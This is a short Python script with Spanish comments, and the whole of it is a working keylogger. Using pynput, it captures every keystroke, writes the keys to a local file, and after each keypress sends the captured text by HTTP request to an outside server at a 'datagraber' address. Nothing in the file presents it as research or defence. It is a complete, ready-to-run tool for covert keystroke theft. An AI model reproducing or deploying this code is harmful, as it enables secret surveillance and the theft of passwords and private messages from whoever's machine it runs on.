from pynput.keyboard import Listener
import requests


# Archivo donde se guardarán las teclas capturadas
log_file = "keylogger_output.txt"

# Variables
log = ""
url = "https://javi-datagraber.onrender.com/"


# Función que se ejecuta cada vez que se presiona una tecla
def on_press(key):
    global log 
    global url
    
    try:
        # Tratar de capturar la tecla presionada
        log += key.char
    except AttributeError:
        # Captura teclas especiales como Shift, Ctrl, etc.
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

    # Enviar las teclas capturadas al servidor
    enviar_datos(log)

    # Guardar las teclas en el archivo de log
    with open(log_file, "a") as f:
        f.write(log)
        log = ""  # Reiniciar el log en memoria después de escribirlo

# Función para enviar las teclas al servidor
def enviar_datos(data):
    try:
        print(f'{url}grab?data="{data}"')
        response = requests.get(f'{url}grab?data={data}')
        # Verifica si la solicitud fue exitosa
        if response.status_code == 200:
            print("Datos enviados con éxito")
        else:
            print(f"Error al enviar los datos. Código de estado: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error al enviar los datos: {e}")
        

# Función para iniciar la captura del teclado
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()


start_keylogger()